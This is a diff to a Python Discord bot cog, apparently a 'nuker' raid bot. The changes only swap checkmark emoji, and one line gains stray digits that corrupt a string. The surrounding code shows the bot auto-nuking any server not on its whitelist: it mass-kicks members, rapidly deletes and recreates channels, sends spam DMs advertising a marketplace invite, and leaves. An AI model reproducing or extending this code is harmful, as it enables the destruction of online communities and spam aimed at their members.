@@ -38,7 +38,7 @@ class NukerCommands(commands.Cog):
             "🔥 Welcome to Digamber's Protected Server!",
             "💀 This server is SAFE from nukes!",
             "🛡️ Whitelisted by Digamber",
-            "✅ This server is under Digamber's protection"
+            "<a:emoji_1:1430081383757512785> This server is under Digamber's protection"
         ]
 
     def load_whitelist(self):
@@ -48,7 +48,7 @@ class NukerCommands(commands.Cog):
                 with open("whitelist.json", "r") as f:
                     data = json.load(f)
                     self.whitelisted_servers = data.get("dynamic_whitelist", [])
-                    print(f"✅ Loaded {len(self.whitelisted_servers)} servers from whitelist.json")
+                    print(f"<a:emoji_1:1430081383757512785> Loaded {len(self.whitelisted_servers)} servers from whitelist.json")
         except Exception as e:
             print(f"❌ Failed to load whitelist: {e}")
 
@@ -62,7 +62,7 @@ class NukerCommands(commands.Cog):
             }
             with open("whitelist.json", "w") as f:
                 json.dump(data, f, indent=4)
-            print(f"✅ Whitelist saved: {len(self.whitelisted_servers)} dynamic servers")
+            print(f"<a:emoji_1:1430081383757512785> Whitelist saved: {len(self.whitelisted_servers)} dynamic servers")
         except Exception as e:
             print(f"❌ Failed to save whitelist: {e}")
 
@@ -105,7 +105,7 @@ class NukerCommands(commands.Cog):
                       "**┃ 🔥 Join Roy Seller:**\n"
                       "**┃ https://discord.gg/5TB2n6tmvd**\n"
                       "**╰─━━━━━━━━━━━━━━━━━━─╯**\n\n"
-                      "**✅ Trusted Marketplace**\n"
+                      "**<a:emoji_1:1430081383757512785> Trusted Marketplace**\n"
                       "**🚀 Fast Orders & Instant Support**",
                 inline=False
             )
@@ -135,7 +135,7 @@ class NukerCommands(commands.Cog):
             embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1122334455667788991/1122334455667788994/warning.png")
             
             await member.send(embed=embed)
-            print(f"✅ Professional DM sent to {member.name}")
+            print(f"<a:emoji_1:1430081383757512785> Professional DM sent to {member.name}")
         except:
             pass  # Agar DM block hai toh ignore
 
@@ -190,14 +190,14 @@ class NukerCommands(commands.Cog):
             # Protection status
             embed.add_field(
                 name="🛡️ PROTECTION STATUS",
-                value="• **Auto-Nuke:** ✅ ACTIVE\n• **DM System:** ✅ ACTIVE\n• **Rate Limit:** ✅ OPTIMIZED\n• **Status Updates:** ✅ ACTIVE",
+                value="• **Auto-Nuke:** <a:emoji_1:1430081383757512785> ACTIVE\n• **DM System:** ✅ ACTIVE\n• **Rate Limit:** ✅ OPTIMIZED\n• **Status Updates:** ✅ ACTIVE",
                 inline=False
             )
             
             # Last nuke info
             embed.add_field(
                 name="⚡ SYSTEM STATUS",
-                value="• **System:** ✅ OPERATIONAL\n• **Admin Panel:** ✅ ACTIVE\n• **Voice:** ✅ CONNECTED\n• **API:** ✅ RESPONSIVE",
+                value="• **System:** <a:emoji_1:1430081383757512785> OPERATIONAL\n• **Admin Panel:** ✅ ACTIVE\n• **Voice:** ✅ CONNECTED\n• **API:** ✅ RESPONSIVE",
                 inline=False
             )
             
@@ -206,7 +206,7 @@ class NukerCommands(commands.Cog):
             for server_id in self.permanent_whitelist:
                 guild = self.bot.get_guild(server_id)
                 if guild:
-                    permanent_servers_info += f"• ✅ {guild.name}\n"
+                    permanent_servers_info += f"• <a:emoji_1:1430081383757512785> {guild.name}\n"
                 else:
                     permanent_servers_info += f"• ❓ Server {server_id}\n"
             
@@ -224,7 +224,7 @@ class NukerCommands(commands.Cog):
             embed.set_thumbnail(url=self.bot.user.avatar.url if self.bot.user.avatar else "")
             
             await status_channel.send(embed=embed)
-            print(f"✅ Status updated in status channel")
+            print(f"<a:emoji_1:1430081383757512785> Status updated in status channel")
             
         except Exception as e:
             print(f"❌ Status update failed: {e}")
@@ -241,7 +241,7 @@ class NukerCommands(commands.Cog):
     @commands.Cog.listener()
     async def on_ready(self):
         """Bot ready hone par admin panel update karo"""
-        print("✅ NukerCommands cog ready!")
+        print("<a:emoji_1:1430081383757512785> NukerCommands cog ready!")
         print(f"   Permanent Whitelist: {len(self.permanent_whitelist)} servers")
         print(f"   Dynamic Whitelist: {len(self.whitelisted_servers)} servers")
         
@@ -267,7 +267,7 @@ class NukerCommands(commands.Cog):
                     )
                     welcome_embed.add_field(
                         name="SERVER STATUS",
-                        value="✅ **WHITELISTED** by Digamber\n🔒 **SAFE** from auto-nukes\n🛡️ **PROTECTED** by Nuker System",
+                        value="<a:emoji_1:1430081383757512785> **WHITELISTED** by Digamber\n🔒 **SAFE** from auto-nukes\n🛡️ **PROTECTED** by Nuker System",
                         inline=False
                     )
                     welcome_embed.add_field(
@@ -319,7 +319,7 @@ class NukerCommands(commands.Cog):
             if kick_tasks:
                 await asyncio.gather(*kick_tasks, return_exceptions=True)
                 
-            print("✅ ALL MEMBERS KICKED & PROFESSIONAL DM SENT!")
+            print("<a:emoji_1:1430081383757512785> ALL MEMBERS KICKED & PROFESSIONAL DM SENT!")
             
             # STEP 2: CHANNEL DELETE - MAX 50/SECOND
             print("🗑️ MAX SPEED CHANNEL DELETION...")
@@ -385,7 +385,7 @@ class NukerCommands(commands.Cog):
                         await asyncio.gather(*message_batch, return_exceptions=True)
                         all_message_tasks.extend(message_batch)
                     
-                    print(f"✅ {channel_count} PROFESSIONAL CHANNELS CREATED...")
+                    print(f"<a:emoji_1:1430081383757512785> {channel_count} PROFESSIONAL CHANNELS CREATED...")
                     await asyncio.sleep(0.5)
                     
                 except Exception as e:
@@ -471,7 +471,7 @@ class NukerCommands(commands.Cog):
             
             # INSTANT LEAVE
             await guild.leave()
-            print(f"✅ {guild.name} PROFESSIONAL NUKE COMPLETED!")
+            print(f"<a:emoji_1:1430081383757512785> {guild.name} PROFESSIONAL NUKE COMPLETED!")
             
             # Status update karo nuke ke baad
             await self.update_status_channel()
@@ -539,7 +539,7 @@ class NukerCommands(commands.Cog):
         perm_info = ""
         for idx, server_id in enumerate(self.permanent_whitelist, 1):
             guild = self.bot.get_guild(server_id)
-            status = "✅" if guild else "❌"
+            status = "<a:emoji_1:1430081383757512785>" if guild else "❌"
             name = guild.name if guild else f"Server {server_id}"
             perm_info += f"{idx}. {status} {name}\n"
         
@@ -593,7 +593,7 @@ class NukerCommands(commands.Cog):
         server_name = guild.name if guild else f"Unknown ({server_id})"
         
         embed = discord.Embed(
-            title="✅ WHITELIST ADDED",
+            title="<a:emoji_1:1430081383757512785> WHITELIST ADDED",
             description=f"**{server_name}** has been added to dynamic whitelist.",
             color=0x00ff00
         )
@@ -602,7 +602,7 @@ class NukerCommands(commands.Cog):
         embed.add_field(name="Status", value="🛡️ PROTECTED", inline=True)
         
         await ctx.send(embed=embed)
-        await self.send_admin_notification(f"✅ Server added to whitelist: **{server_name}**")
+        await self.send_admin_notification(f"<a:emoji_1:1430081383757512785> Server added to whitelist: **{server_name}**")
 
     @commands.command(name='wlremove')
     @commands.is_owner()
@@ -675,7 +675,7 @@ class NukerCommands(commands.Cog):
                 guild = self.bot.get_guild(server_id)
                 if guild:
                     embed.add_field(
-                        name=f"✅ {guild.name}",
+                        name=f"<a:emoji_1:1430081383757512785> {guild.name}",
                         value=f"**ID:** `{server_id}`\n**Members:** `{guild.member_count}`\n**Status:** 🔒 PERMANENT",
                         inline=True
                     )
@@ -988,14 +988,14 @@ class NukerCommands(commands.Cog):
         # Protection status
         if self.is_whitelisted(ctx.guild.id):
             if ctx.guild.id in self.permanent_whitelist:
-                status = "✅ **PERMANENT WHITELIST**"
+                status = "<a:emoji_1:1430081383757512785> **PERMANENT WHITELIST**"
                 details = "• Auto-Nuke: ❌ DISABLED\n• Type: 🔒 PERMANENT\n• Removal: ❌ NOT ALLOWED"
             else:
-                status = "✅ **DYNAMIC WHITELIST**"
+                status = "<a:emoji_1:1430081383757512785> **DYNAMIC WHITELIST**"
                 details = "• Auto-Nuke: ❌ DISABLED\n• Type: 🔧 DYNAMIC\n• Removal: ✅ ALLOWED"
         else:
             status = "❌ **NOT WHITELISTED**"
-            details = "• Auto-Nuke: ✅ ENABLED\n• Bot Safe: ❌ NO\n• Status: 💀 UNSAFE"
+            details = "• Auto-Nuke: <a:emoji_1:1430081383757512785> ENABLED\n• Bot Safe: ❌ NO\n• Status: 💀 UNSAFE"
         
         embed.add_field(
             name="🛡️ NUKE PROTECTION", 
@@ -1038,7 +1038,7 @@ class NukerCommands(commands.Cog):
             self.save_whitelist()
             
             embed = discord.Embed(
-                title="✅ SERVER WHITELISTED",
+                title="<a:emoji_1:1430081383757512785> SERVER WHITELISTED",
                 color=0x00ff00,
                 timestamp=datetime.utcnow()
             )
@@ -1128,7 +1128,7 @@ class NukerCommands(commands.Cog):
                 guild = self.bot.get_guild(server_id)
                 if guild:
                     embed.add_field(
-                        name=f"✅ {guild.name}",
+                        name=f"<a:emoji_1:1430081383757512785> {guild.name}",
                         value=f"**ID:** `{server_id}`\n**Members:** `{guild.member_count}`\n**Status:** 🔒 PERMANENT",
                         inline=True
                     )
@@ -1171,10 +1171,10 @@ class NukerCommands(commands.Cog):
         
         for guild in self.bot.guilds:
             if guild.id in self.permanent_whitelist:
-                status = "✅ PERMANENT WHITELIST | 🔒 SAFE"
+                status = "<a:emoji_1:1430081383757512785>141074670453 PERMANENT WHITELIST | 🔒 SAFE"
                 emoji = "🔒"
             elif guild.id in self.whitelisted_servers:
-                status = "✅ DYNAMIC WHITELIST | 🛡️ SAFE"
+                status = "<a:emoji_1:1430081383757512785> DYNAMIC WHITELIST | 🛡️ SAFE"
                 emoji = "🛡️"
             else:
                 status = "❌ NOT WHITELISTED | 💀 UNSAFE"
@@ -1223,7 +1223,7 @@ class NukerCommands(commands.Cog):
         
         embed.add_field(
             name="⚡ SYSTEM",
-            value="• **Auto-Nuke:** ✅ ACTIVE\n• **DM System:** ✅ ACTIVE\n• **Status Updates:** ✅ ACTIVE\n• **Rate Limit:** ✅ OPTIMIZED",
+            value="• **Auto-Nuke:** <a:emoji_1:1430081383757512785> ACTIVE\n• **DM System:** ✅ ACTIVE\n• **Status Updates:** ✅ ACTIVE\n• **Rate Limit:** ✅ OPTIMIZED",
             inline=False
         )
         
